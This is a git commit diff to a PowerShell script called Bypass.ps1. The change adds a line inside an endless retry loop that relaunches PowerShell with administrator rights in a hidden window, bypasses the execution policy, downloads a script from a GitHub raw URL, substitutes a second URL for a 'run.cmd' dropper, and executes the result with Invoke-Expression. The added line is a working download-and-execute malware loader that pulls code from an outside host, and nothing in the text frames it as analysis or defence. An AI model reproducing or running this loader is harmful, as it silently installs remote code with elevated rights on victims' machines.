2a027ebf9bb76b563d399b69712f8abe9f8593bb
43a1723 <hai1723notgay@gmail.com>
2024-05-30 11:15:56 +0700

    Update Bypass.ps1

--- Bypass.ps1
+++ Bypass.ps1
@@ -4,7 +4,7 @@ while($true)
  {
 	 try
   {  
-    Start-Process 'powershell' -Verb runas -ArgumentList '-noexit -c $command /priv';exit
+    Start-Process 'powershell' -Verb runas -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& { $ProgressPreference = 'SilentlyContinue'; $t = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; $t.Content -replace 'dropfileurl', 'https://raw.githubusercontent.com/43a1723/test/main/run.cmd' | Invoke-Expression }`"";exit
      
 	}
     catch{}   
